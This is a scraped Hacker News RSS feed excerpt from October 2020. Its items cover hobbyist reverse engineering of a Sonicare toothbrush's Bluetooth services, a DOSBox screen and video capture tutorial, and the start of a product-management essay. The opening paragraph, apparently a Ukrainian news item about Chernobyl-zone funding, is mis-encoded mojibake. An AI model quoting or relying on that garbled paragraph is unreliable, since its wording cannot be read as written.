<p>Ð¯Ðº Ð¿Ð¾Ð²Ñ–Ð´Ð¾Ð¼Ð»Ñ�Ð² Ð£ÐºÑ€Ñ–Ð½Ñ„Ð¾Ñ€Ð¼, 20 Ð¶Ð¾Ð²Ñ‚Ð½Ñ� Ñƒ Ð”Ð�Ð—Ð’ Ð·Ð°Ñ�Ð²Ð¸Ð»Ð¸ Ð¿Ñ€Ð¾ Ð´ÐµÑ„Ñ–Ñ†Ð¸Ñ‚ ÐºÐ¾ÑˆÑ‚Ñ–Ð² Ð½Ð° Ð¿Ñ–Ð´Ð¿Ñ€Ð¸Ñ”Ð¼Ñ�Ñ‚Ð²Ð°Ñ… Ð·Ð¾Ð½Ð¸ Ð²Ñ–Ð´Ñ‡ÑƒÐ¶ÐµÐ½Ð½Ñ�, Ñ‰Ð¾ Ð²Ð¸Ð½Ð¸Ðº ÑƒÐ½Ð°Ñ�Ð»Ñ–Ð´Ð¾Ðº Ð½ÐµÐ´Ð¾Ñ�Ñ‚Ð°Ñ‚Ð½ÑŒÐ¾Ð³Ð¾ Ñ„Ñ–Ð½Ð°Ð½Ñ�ÑƒÐ²Ð°Ð½Ð½Ñ� Ñƒ 2020 Ñ€Ð¾Ñ†Ñ– Ð´Ð²Ð¾Ñ… Ð±ÑŽÐ´Ð¶ÐµÑ‚Ð½Ð¸Ñ… Ð¿Ñ€Ð¾Ð³Ñ€Ð°Ð¼. ÐŸÑ€Ð¾Ð±Ð»ÐµÐ¼Ð¸ Ð· Ñ„Ñ–Ð½Ð°Ð½Ñ�ÑƒÐ²Ð°Ð½Ð½Ñ�Ð¼ Ð¿Ð¾Ñ‚Ð¾Ñ‡Ð½Ð¸Ñ… Ð²Ð¸Ð´Ð°Ñ‚ÐºÑ–Ð² Ñ” Ð½Ðµ Ð»Ð¸ÑˆÐµ Ð½Ð° Ð§Ð�Ð•Ð¡, Ð° Ð¹ Ð½Ð° Ð”ÐŸ "Ð¦ÐžÐ¢Ð†Ð—", Ð”Ð¡ÐŸ "Ð•ÐºÐ¾Ñ†ÐµÐ½Ñ‚Ñ€", Ð”Ð¡ÐŸ "ÐŸÑ–Ð²Ð½Ñ–Ñ‡Ð½Ð° ÐŸÑƒÑ‰Ð°", Ð”Ð¡ÐŸ "Ð¦ÐŸÐŸÐ&nbsp;Ð’".</p>

                    </div>
</div></div>]]>
            </description>
            <link>https://www.ukrinform.ua/rubric-technology/3122689-robotpes-vid-boston-dynamics-zamirav-radiaciu-u-zoni-vidcuzenna.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24882438</guid>
            <pubDate>Sat, 24 Oct 2020 22:33:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My toothbrush streams gyroscope data]]>
            </title>
            <description>
<![CDATA[
Score 140 | Comments 81 (<a href="https://news.ycombinator.com/item?id=24881729">thread link</a>) | @zdw
<br/>
October 24, 2020 | https://blog.johannes-mittendorfer.com/artikel/2020/10/my-toothbrush-streams-gyroscope-data | <a href="https://web.archive.org/web/*/https://blog.johannes-mittendorfer.com/artikel/2020/10/my-toothbrush-streams-gyroscope-data">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
            <p>Since a few month I own an electrical toothbrush from Phillips called <a href="https://www.google.com/search?q=Sonicare+HX992B">Sonicare HX992B</a>. It connects to <a href="https://play.google.com/store/apps/details?id=com.philips.cdp.ohc.tuscany" title="App">an mobile App</a> using Bluetooth that tells you how well you brushed your teeth, shows the orientation in real-time, and also notifies you when to change the brush for a new one.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/sonicare-image.jpeg" alt="Phillips Sonicare"></p>
            <p>I was curious how this exactly works. Since the application uses Bluetooth Low Energy (BLE), I used the <a href="https://play.google.com/store/apps/details?id=no.nordicsemi.android.mcp">nRF Connect</a> app for Android to get a list of advertised services.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/whatsapp-image-2020-10-09-at-19-34-24.jpeg" alt="Screenshot of nRF connect" title="Screenshot of nRF connect"></p>
            <p>Now I had a list of 12 BLE services of which only four are <a href="https://www.bluetooth.com/de/specifications/gatt/" title="List of common services">standard services described on bluetooth.com</a>. In addition to well-known services like Generic Access, Generic Attribute, Device Information and Battery Service, also eight custom services exist, that were created by the manufacturer. Every one of the first seven service UUIDs starts with <code>477ea600-a260-11e4-ae37-0002a5d5000</code> and ends with a number from 1 to 8 with number 3 missing. An additional eight service has a completely different prefix than the others.</p>
            <table>
              <thead>
                <tr>
                  <th>UUID</th>
                  <th>Service</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>0x1800</td>
                  <td>Generic Access</td>
                </tr>
                <tr>
                  <td>0x1801</td>
                  <td>Generic Attribute</td>
                </tr>
                <tr>
                  <td>0x180a</td>
                  <td>Device Information</td>
                </tr>
                <tr>
                  <td>0x180f</td>
                  <td>Battery Service</td>
                </tr>
                <tr>
                  <td>477ea600-a260-11e4-ae37-0002a5d50001</td>
                  <td>Unknown Service 1</td>
                </tr>
                <tr>
                  <td>477ea600-a260-11e4-ae37-0002a5d50002</td>
                  <td>Unknown Service 2</td>
                </tr>
                <tr>
                  <td>477ea600-a260-11e4-ae37-0002a5d50004</td>
                  <td>Unknown Service 4</td>
                </tr>
                <tr>
                  <td>477ea600-a260-11e4-ae37-0002a5d50005</td>
                  <td>Unknown Service 5</td>
                </tr>
                <tr>
                  <td>477ea600-a260-11e4-ae37-0002a5d50006</td>
                  <td>Unknown Service 6</td>
                </tr>
                <tr>
                  <td>477ea600-a260-11e4-ae37-0002a5d50007</td>
                  <td>Unknown Service 7</td>
                </tr>
                <tr>
                  <td>477ea600-a260-11e4-ae37-0002a5d50008</td>
                  <td>Unknown Service 8</td>
                </tr>
                <tr>
                  <td>a651fff1-4074-4131-bce9-56d4261bc7b1</td>
                  <td>Unknown Other Service</td>
                </tr>
              </tbody>
            </table>
            <p>By switching the device on and off, changing the strength and mode and also by changing the brush back and forth, I was able to identify some of the characteristics of the six services. By reverse engineering the code of the Android app using <a href="https://github.com/skylot/jadx">jadx</a> I found information about the session storage and many other things.</p>
            <table>
              <thead>
                <tr>
                  <th>Service</th>
                  <th>Suffix</th>
                  <th>Actions</th>
                  <th>Description</th>
                </tr>
              </thead>
              <tbody>
                <tr>
                  <td>Handle (1)</td>
                  <td>4010</td>
                  <td>RWN</td>
                  <td>Handle State: Off(0), Standby(1), Run(2),Charge(3), Shutdown(4) Validate(6), LightsOut(7)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4020</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4022</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4030</td>
                  <td>R-N</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4040</td>
                  <td>RW-</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4050</td>
                  <td>RW-</td>
                  <td>Current Time (Unix Timestamp)</td>
                </tr>
                <tr>
                  <td>Brushing (2)</td>
                  <td>4070</td>
                  <td>R-N</td>
                  <td>Current session id</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4080</td>
                  <td>R–</td>
                  <td>Mode (0x0=Clean, 0x2=White+, …)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4082</td>
                  <td>RWN</td>
                  <td>State (0=Ready, 1=Active, 2=Resume)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4090</td>
                  <td>R-N</td>
                  <td>Active time in seconds</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4091</td>
                  <td>R-N</td>
                  <td>Mode 2 (0x78=Clean, 0xa0=White+, 0xc8=Gum Health, 0xb4=Deep Clean+)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>40a0</td>
                  <td>R-N</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>40b0</td>
                  <td>R-N</td>
                  <td>Strength (0,1,2)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>40c0</td>
                  <td>R-N</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>Session Storage (4)</td>
                  <td>40d0</td>
                  <td>R-N</td>
                  <td>Last session id (e.g. 0x2c05 = 1324)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>40d2</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>40d5</td>
                  <td>RW-</td>
                  <td>Session Type</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>40e0</td>
                  <td>-WN</td>
                  <td>Request session (write session id, write 0x00 to 4110, get notification with data here and at 4100)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4100</td>
                  <td>–N</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4110</td>
                  <td>-WN</td>
                  <td>Session Access Control Point</td>
                </tr>
                <tr>
                  <td>Orientation (5)</td>
                  <td>4120</td>
                  <td>RW-</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4130</td>
                  <td>–N</td>
                  <td>Gyroscope Data</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4140</td>
                  <td>-WN</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>Brush (6)</td>
                  <td>4210</td>
                  <td>R–</td>
                  <td>NFC Tag Version</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4220</td>
                  <td>R–</td>
                  <td>? INT8</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4230</td>
                  <td>R-N</td>
                  <td>Brush Serial</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4240</td>
                  <td>R–</td>
                  <td>Brush Manufacturing Date?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4250</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4254</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4260</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4270</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4280</td>
                  <td>R–</td>
                  <td>Brush Lifetime (Seconds)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4290</td>
                  <td>R–</td>
                  <td>Brush Usage (Seconds)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>42a0</td>
                  <td>R–</td>
                  <td>Brush Type (None, Adaptive Clean, Adaptive White, Tongue Care, Adaptive Gums)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>42a2</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>42a4</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>42a6</td>
                  <td>RWN</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>42b0</td>
                  <td>R–</td>
                  <td>NFC Payload (always phillips.com)</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>42c0</td>
                  <td>R–</td>
                  <td>? INT16</td>
                </tr>
                <tr>
                  <td>7</td>
                  <td>4310</td>
                  <td>R–</td>
                  <td>? INT16</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4320</td>
                  <td>R–</td>
                  <td>? INT16</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4330</td>
                  <td>R–</td>
                  <td>?</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4360</td>
                  <td>R–</td>
                  <td>? (Only uses second byte)</td>
                </tr>
                <tr>
                  <td>8</td>
                  <td>4410</td>
                  <td>RW-</td>
                  <td>? INT16</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td>4420</td>
                  <td>RW-</td>
                  <td>? INT32</td>
                </tr>
              </tbody>
            </table>
            <p>According to the application sources, the last unknown service is called “Moonshine Streaming” and is used to update the firmware. I agreed with myself to not touch this one, since I could damage the firmware and would need to brush my teeth by hand again.</p>
            <p>Since I could see a very course orientation displayed in the app during a cleaning session, I expected orientation data somewhere in the characteristics. I found them in the service <code>5</code>. Once you enable notifications for the <code>4130</code> service, you get a data stream to byte arrays. It turns out, these are indeed the values of the gyroscope.</p>
            <p><img src="https://blog.johannes-mittendorfer.com/assets/img/sonicare-gyro.png" alt="Gyroscrope" title="Gyroscope"></p>
            <p>I created a python library to interface with the toothbrush in Python. Feel free to experiment, find the meaning of the missing services and submit pull requests: <a href="https://github.com/joushx/python-sonicare">https://github.com/joushx/python-sonicare</a></p>
          </div></div>]]>
            </description>
            <link>https://blog.johannes-mittendorfer.com/artikel/2020/10/my-toothbrush-streams-gyroscope-data</link>
            <guid isPermaLink="false">hacker-news-small-sites-24881729</guid>
            <pubDate>Sat, 24 Oct 2020 20:26:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Implement a retro game in JavaScript with MakeCode Arcade style sprites]]>
            </title>
            <description>
<![CDATA[
Score 30 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24881012">thread link</a>) | @codeguppy
<br/>
October 24, 2020 | https://codeguppy.com/code.html?t=mars_attack&list=games | <a href="https://web.archive.org/web/*/https://codeguppy.com/code.html?t=mars_attack&list=games">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://codeguppy.com/code.html?t=mars_attack&amp;list=games</link>
            <guid isPermaLink="false">hacker-news-small-sites-24881012</guid>
            <pubDate>Sat, 24 Oct 2020 18:30:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Good Quality DOSBox Video Capture]]>
            </title>
            <description>
<![CDATA[
Score 43 | Comments 19 (<a href="https://news.ycombinator.com/item?id=24880762">thread link</a>) | @headalgorithm
<br/>
October 24, 2020 | https://susam.in/blog/good-quality-dosbox-video-capture/ | <a href="https://web.archive.org/web/*/https://susam.in/blog/good-quality-dosbox-video-capture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>By <b>Susam Pal</b> on 01 Sep 2020</p>
<h2 id="vintage-dos-programs"><a href="#vintage-dos-programs">Vintage DOS Programs</a></h2>

<p>
Once in a while, I fire up one of the vintage DOS games or language
interpreters in DOSBox for nostalgia's sake. I have archived these
vintage programs at <a href="https://github.com/susam/dosage">github.com/susam/dosage</a>.
DOSBox is an emulator program that emulates IBM PC compatible computers
running DOS. Trying my hands on these antiquated DOS programs now evokes
old memories from my childhood days days when I first came across
computers as part of our primary school curriculum.
</p>

<p>
Computers were much simpler in those days. The ones in our school were
IBM PC compatible computers with mostly monochrome displays. A couple of
them had support for a very limited number of colours provided by CGA or
EGA graphics cards. The ability to boot a computer using a
5¼-inch floppy disk containing MS-DOS, load a Logo or BASIC
interpreter, or a computer game from another floppy disk, and then write
some programs or play a few games without any distraction had its own
charm that I find missing from modern day computing.
</p>

<p>
Often while using old DOS programs with DOSBox in this day and age, I
want to take screenshot captures or video captures of the DOSBox
sessions and share them with my friends. In this article, I will explain
how I create good quality screenshot captures and video captures of
DOSBox sessions in formats that I can share with others.
</p>


<h2 id="contents"><a href="#contents">Contents</a></h2>
<ul>
  <li><a href="#vintage-dos-programs">Vintage DOS Programs</a></li>
  <li><a href="#software-versions">Software Versions</a></li>
  <li><a href="#ibm-pc-logo-in-dosbox">IBM PC Logo in DOSBox</a></li>
  <li><a href="#digger-in-dosbox">Digger in DOSBox</a></li>
  <li><a href="#dosbox-screenshot-capture">DOSBox Screenshot Capture</a></li>
  <li><a href="#dosbox-video-capture">DOSBox Video Capture</a></li>
  <li><a href="#dosbox-audio-video-capture">DOSBox Audio/Video Capture</a></li>
  <li><a href="#dosbox-gif-animation">DOSBox GIF Animation</a></li>
  <li><a href="#references">References</a></li>
</ul>


<h2 id="software-versions"><a href="#software-versions">Software Versions</a></h2>

<p>
Since this article involves several pieces of software, some of what is
written here may not hold good in future if the behaviour of any of
these software tools change in future. The list below contains the
versions of all software tools that were used to test the commands
provided in this article:
</p>

<ol>
  <li>macOS High Sierra 10.13.6</li>
  <li>DOSBox 0.74-3</li>
  <li>FFmpeg 4.3.1</li>
  <li>ImageMagick 7.0.10-28
  </li><li>IBM Personal Computer Logo Version 1.00</li>
  <li>Digger (Original PC booter version by Windmill Software)</li>
</ol>

<p>
Note that both Logo and Digger programs in the list above are DOS
programs that were released in 1983. They cannot be run directly on
modern computers but they can be run with DOSBox since it emulates old
IBM PC compatible computers.
</p>


<h2 id="ibm-pc-logo-in-dosbox"><a href="#ibm-pc-logo-in-dosbox">IBM PC Logo in DOSBox</a></h2>

<p>
IBM Personal Computer Logo developed by Logo Computer Systems Inc.
(LCSI) in 1983 was the first piece of software I got introduced to while
learning computers as a kid. I came across it at the age of 8 when I was
in Class 4 and our school had a 5¼-inch floppy disk with IBM PC
Logo on it. As a result, Logo was the first programming language I
learnt in my life. About 20 years later, I would realize that the first
programming language I learnt is a dialect of Lisp. How wonderful!
</p>

<figure id="logo-welcome-screenshot">
  <a href="https://susam.in/files/blog/dosbox-logo-0.png"><img src="https://susam.in/files/blog/dosbox-logo-0.png" alt="A screenshot of IBM Personal Computer Logo with copyright notices of IBM and LCSI, welcome message, and question mark prompt"></a>
  <figcaption>
    Welcome screen of IBM Personal Computer Logo
  </figcaption>
</figure>

<!--
Class Age Year
   KG   4   88
    1   5   89
    2   6   90
    3   7   91
    4   8   92
    5   9   93
    6  10   94
    7  11   95
    8  12   96
    9  13   97
   10  14   98
-->

<p>
If the Logo interpreter program <code>LOGO.COM</code> exists in the
current directory, it can be run with DOSBox using the following
command:
</p>

<pre><code>dosbox LOGO.COM</code></pre>

<p>
One of the things I enjoyed drawing with Logo was a grid of overlapping
circles like this:
</p>

<figure id="logo-program-screenshot">
  <a href="https://susam.in/files/blog/dosbox-logo-1.png"><img src="https://susam.in/files/blog/dosbox-logo-1.png" alt="A grid made with 20 circles along with Logo source code for it"></a>
  <figcaption>
    Grid of circles drawn with IBM Personal Computer Logo
  </figcaption>
</figure>

<p>
Here is the Logo source code for the above output:
</p>

<pre><code>REPEAT 20 [REPEAT 180 [FD 1 RT 2] RT 18]</code>
</pre>


<h2 id="digger-in-dosbox"><a href="#digger-in-dosbox">Digger in DOSBox</a></h2>

<p>
At around the same time I learnt Logo, I also came across Digger, a
computer game for IBM PC developed by Windmill Software in 1983.
</p>

<figure id="digger-welcome-screenshot">
  <a href="https://susam.in/files/blog/dosbox-digger-0.png"><img src="https://susam.in/files/blog/dosbox-digger-0.png" alt="A screenshot of Digger welcome screen with the names and pictures of various game characters with a copyright notice of Windmill Software"></a>
  <figcaption>
    Welcome screen of Digger
  </figcaption>
</figure>

<p>
If the Digger program <code>DIGGER.COM</code> exists in the directory,
it can be run using DOSBox with the following command:
</p>

<pre><code>dosbox DIGGER.COM -c "config -set cpu cycles=500" -machine cga</code>
</pre>

<p>
The <code>-machine cga</code> option emulates a machine with Color
Graphics Adapter (CGA) because Digger requires a machine of this type to
run correctly. The <code>cycles=500</code> configuration option slows
down the speed at which DOSBox emulates instructions in order to emulate
the slow machines of olden days. Without this option, Digger runs too
fast to be able to be conveniently playable.
</p>

<figure id="digger-game-screenshot">
  <a href="https://susam.in/files/blog/dosbox-digger-1.png"><img src="https://susam.in/files/blog/dosbox-digger-1.png" alt="A screenshot of underground maze in the game of Digger"></a>
  <figcaption>
    A game of Digger that has just begun
  </figcaption>
</figure>

<p>
Digger has an excellent gameplay where the player digs through
underground tunnels to pick up emeralds, drop gold bags to release the
gold or squash nobbins and hobbins, collect the released gold to earn
more points, and so on. It uses bright and attractive colours. The music
is great. When Digger was released in 1983, it was quite advanced for
its time.
</p>



<h2 id="dosbox-screenshot-capture"><a href="#dosbox-screenshot-capture">DOSBox Screenshot Capture</a></h2>

<p>
The screenshots above were obtained by running IBM PC Logo and the
original 1983 PC booter version of Digger on DOSBox and then resizing
the screenshots such that their aspect ratio matches the aspect ratio of
old CRT computer monitors.
</p>

<p>
To obtain the screenshots, we first press <kbd>Ctrl</kbd> +
<kbd>F5</kbd> while DOSBox is running. The paths of the screenshots
appear in the console output at the terminal where DOSBox was launched.
For example:
</p>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_001.png</samp>
</pre>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_001.png</samp>
</pre>

<p>
The screenshots obtained in this manner have an aspect ratio of 8:5
which makes the output look stretched horizontally. The old CRT computer
monitors for which these old DOS programs were written had an aspect
ratio of 4:3 instead. This stretched look can be fixed by resizing the
images to an aspect ratio of 4:3. Here are the commands used to fix the
aspect ratio and produce the images:
</p>

<pre><code>convert logo_000.png -sample '1920x1440!' dosbox-logo-0.png
convert logo_001.png -sample '1920x1440!' dosbox-logo-1.png</code>
</pre>
<pre><code>convert digger_000.png -sample '1920x1440!' dosbox-digger-0.png
convert digger_001.png -sample '1920x1440!' dosbox-digger-1.png</code>
</pre>

<!--
According to Screen Resolution Statistics for January 2020 by
w3schools.com, here are the statistics of browser resolutions:

Resolution   %age  Cumulative

Lower         9.0    9.0
1280 x  720   3.9   12.9
1024 x  768   1.4   14.3
1360 x  768   1.0   15.3
1366 x  768  27.6   42.9
1280 x  800   1.8   44.7
1536 x  864   9.8   54.5
1440 x  900   5.6   60.1
1600 x  900   4.1   64.2
1280 x 1024   2.4   66.6
1680 x 1050   2.6   69.2
1920 x 1080  20.3   89.5
1920 x 1200   1.5   91.0
2560 x 1440   1.7   92.7
Other High    7.3  100.0

1440 x 1080 is strictly larger than 55.3% displays.
1600 x 1200 is strictly larger than 66.6% displays.
1920 x 1440 is strictly larger than 91.0% displays.
x 1080 >= 89.5% displays
x 1200 >= 91.0% displays.
x 1440 >= 92.7% displays
-->

<p>
The <code>convert</code> program comes with ImageMagick. There are a few
things worth noting here:
</p>

<ul>
  <li>
    We use the <code>-sample</code> option here to resize the image as
    opposed to using <code>-resize</code> or <code>-scale</code>. The
    <code>-resize</code> or <code>-scale</code> option would smooth the
    jagged edges in the text and graphics by introducing additional
    colours. The <code>-resize</code> option is great for real world
    images where we do want the edges to be smooth while scaling up or
    down but in these screenshots we want to retain the crisp and jagged
    edges that is typical of DOSBox and the old CRT monitors. Therefore
    we use the <code>-sample</code> option that does not introduce any
    new colours. Instead it uses nearest-neighbour interpolation (point
    sampling) to decide the colours of the scaled image.
  </li>
  <li>
    The <code>!</code> flag is used to ignore the aspect ratio of the
    original image. Without this flag, the output files would be
    1920x1200 in size, that is, the largest size with an aspect ratio of
    8:5 that fits in a 1920x1440 box. With this flag, the original
    aspect ratio of 8:5 is ignored and the output is exactly 1920x1440
    in size.
  </li>
</ul>

<p>
By the way, I have donated these images above to Wikimedia Commons under
the Creative Commons Attribution 4.0 International (CC BY 4.0) license:
</p>

<ul>
  <li><a href="https://commons.wikimedia.org/wiki/File:IBM_LCSI_Logo_Welcome_Screen.png">File:IBM_LCSI_Logo_Welcome_Screen.png</a></li>
  <li><a href="https://commons.wikimedia.org/wiki/File:IBM_LCSI_Logo_Circles.png">File:IBM_LCSI_Logo_Circles.png</a></li>
  <li><a href="https://commons.wikimedia.org/wiki/File:Digger_Original_PC_Booter_Version_Welcome_Screen.png">File:Digger_Original_PC_Booter_Version_Welcome_Screen.png</a>
  </li><li><a href="https://commons.wikimedia.org/wiki/File:Digger_Original_PC_Booter_Version_Game.png">File:Digger_Original_PC_Booter_Version_Game.png</a></li>
</ul>

<p>
Having the images on Wikimedia Commons helps to include these
screenshots in the Wikipedia articles on <a href="https://en.wikipedia.org/wiki/Logo_(programming_language)#Implementations">Logo</a>
and <a href="https://en.wikipedia.org/wiki/Digger_(video_game)">Digger</a>.
</p>


<h2 id="dosbox-video-capture"><a href="#dosbox-video-capture">DOSBox Video Capture</a></h2>

<p>
To start capturing video of DOSBox, we press <kbd>Ctrl</kbd> +
<kbd>Alt</kbd> + <kbd>F5</kbd>. The same key combination stops capturing
video. The following output appears in the console output to show where
the video file is saved:
</p>

<pre><samp>Capturing Video to /Users/susam/Library/Preferences/capture/logo_000.avi
Stopped capturing video.</samp>
</pre>

<p>
Say, I want to share a video capture of DOSBox with Logo running on it
with my friends who might be on devices that do not support playing AVI
files. The following FFmpeg command converts the video to a format that
can be distributed widely and played on a wide range of devices and
players:
</p>

<pre><code>ffmpeg -i logo_000.avi -an -c:v libx264 -preset veryslow \
       -crf 17 -vf format=yuv420p,scale=1920:1440:flags=neighbor,fps=30 \
       dosbox-logo.mp4</code>
</pre>

<p>
Here is what the output looks like:
</p>

<figure id="logo-video">
  <video controls="">
    <source src="https://susam.in/files/blog/dosbox-logo.mp4" type="video/mp4">
  </video>
  <figcaption>
    Video capture of IBM Personal Computer Logo
    [<a href="https://susam.in/files/blog/dosbox-logo.mp4">MP4</a>]
  </figcaption>
</figure>

<p>
Let us briefly discuss the various FFmpeg options used here:
</p>

<ul>
  <li>
    <p>
      <code>-i logo_000.avi</code>
    </p>
    <p>
      This, of course, specifies the input file.
    </p>
  </li>
  <li>
    <p>
      <code>-an</code>
    </p>
    <p>
      The audio is silent in this video, so we reduce the file size a
      little by disabling the audio stream with this option. For
      example, without this option the output file size was 317 KB but
      with this option it turned out to be 282 KB.
    </p>
    <p>
      This option should not be specified if the audio stream needs to
      preserved, for example, with DOS games that have audio. We will
      see an example of this in the next section.
    </p>
  </li>
  <li>
    <p>
      <code>-c:v libx264</code>
    </p>
    <p>
      This option selects the x264 encoder to encode the video stream
      into H.264 format. H.264 is also known as MPEG-4 Part 10, Advanced
      Video Coding (MPEG-4 AVC). Currently, it is the most popular
      format for recording, compression, and distribution of video
      content.
    </p>
  </li>
  <li>
    <p>
      <code>-crf 17</code>
    </p>
    <p>
      This option provides visually lossless output, that is, high
      quality output without any loss in quality that can be perceived
      by human eyes. For completely lossless output, we need to use the
      <code>-crf 0</code> option. However, this option sets the video
      profile to <code>High 4:4:4 Predictive</code> which prevents the
      video from playing in some video players. This issue is discussed
      in more detail in the point about <code>yuv420p</code> pixel
      format that comes later in this list. Since <code>-crf 0</code>
      cannot be used due to this issue, the next best option is
      <code>-crf 1</code> which while not completely lossless is much
      better than …</p></li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://susam.in/blog/good-quality-dosbox-video-capture/">https://susam.in/blog/good-quality-dosbox-video-capture/</a></em></p>]]>
            </description>
            <link>https://susam.in/blog/good-quality-dosbox-video-capture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24880762</guid>
            <pubDate>Sat, 24 Oct 2020 17:49:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The four dangerous animals of product development]]>
            </title>
            <description>
<![CDATA[
Score 67 | Comments 33 (<a href="https://news.ycombinator.com/item?id=24880218">thread link</a>) | @ochronus
<br/>
October 24, 2020 | https://ochronus.online/four-dangerous-animals-of-product-development/ | <a href="https://web.archive.org/web/*/https://ochronus.online/four-dangerous-animals-of-product-development/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-233" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">
<div>

<div itemprop="text">
<p>This is going to be a short walk in the product development zoo, I hope you’ll enjoy the ride!</p>
<p><em>Caveat</em>: what you’ll read about are (usually) not personality types but behaviors in a specific (type of) situation. Acting like a HIPPO, a WOLF, a RHINO or a ZEBRA doesn’t make anyone a bad person. You’re still a team, aim to understand where they are coming from, and, well, they might even be right, with the wrong communication style. </p>
<h2>The HIPPO – the Highest Paid Person’s Opinion</h2>
<div>
<div>
<div>
<div>
<figure><picture title="The four dangerous animals of product development 3">
<source type="image/webp" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/10/hippo.png.webp 484w, https://ochronus.online/wp-content/uploads/2020/10/hippo-300x300.png.webp 300w, https://ochronus.online/wp-content/uploads/2020/10/hippo-150x150.png.webp 150w" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20484%20484'%3E%3C/svg%3E" data-lazy-sizes="(max-width: 484px) 100vw, 484px">
<img width="484" height="484" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20484%20484'%3E%3C/svg%3E" alt="hippo - Highest Paid Person's Opinion" data-lazy-srcset="https://ochronus.online/wp-content/uploads/2020/10/hippo.png 484w, https://ochronus.online/wp-content/uploads/2020/10/hippo-300x300.png 300w, https://ochronus.online/wp-content/uploads/2020/10/hippo-150x150.png 150w" data-lazy-sizes="(max-width: 484px) 100vw, 484px" data-lazy-src="https://ochronus.online/wp-content/uploads/2020/10/hippo.png">
</picture>
</figure>
</div>
<div>
<p>It can be tempting to give in to the HIPPOs – founders or CEO or VPS who want to make all the decisions – but don’t let them steer you off course.</p>
<p>Bring everything back to your vision and objectives. If the HIPPOs aren’t aligned with those, you could be headed for dangerous waters.</p>
<p>Don’t let your HiPPO kill your ideas – inform them with data and make them a <a href="https://www.forbes.com/sites/bernardmarr/2017/10/26/data-driven-decision-making-beware-of-the-hippo-effect/" target="_blank" rel="noopener">Data-driven HiPPO</a>! </p>
